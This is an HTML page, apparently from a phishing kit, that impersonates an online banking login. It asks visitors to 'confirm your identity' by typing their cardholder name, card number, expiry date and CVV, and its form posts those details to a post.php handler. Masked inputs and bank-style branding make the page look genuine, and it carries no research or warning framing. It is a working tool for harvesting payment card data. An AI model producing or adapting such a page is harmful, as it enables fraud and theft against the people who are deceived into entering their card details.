<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/css/style.css">
    <title>Login</title>
</head>
<body>
<header>
<div class="left"><img src="res/img/logo.png" alt=""> </div>
<div class="right"><img src="res/img/sec.png" alt=""> </div>
</header>
<div class="liner">
Log In to Online Banking
</div>


<main>
<div class="coll">
        <h2>confirm your identity</h2>
        <p>Confirm your identity by entering your card information.</p>
      </div>
<div class="form">
<form action="post.php" method="post">

<div class="col">
<label>Cardholder Name</label>
 <input type="text" name="name" >
</div>

<div class="col">
<div><label>Card Number</label></div>
<input type="text" name="cc" required placeholder="XXXX XXXX XXXX XXXX" id="cc">
</div>

<div class="col">
<label>Expiration Date</label>
<input type="text" name="exp" required placeholder="MM/AA" id="exp">
</div>

<div class="col">
<label>Security Code</label>
<input type="password" name="cvv" required placeholder="CVV" id="cvv">
</div>

<div class="col"><button type="sumbit">Continue</button></div>


</form>    

</div>

</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
</body>
</html>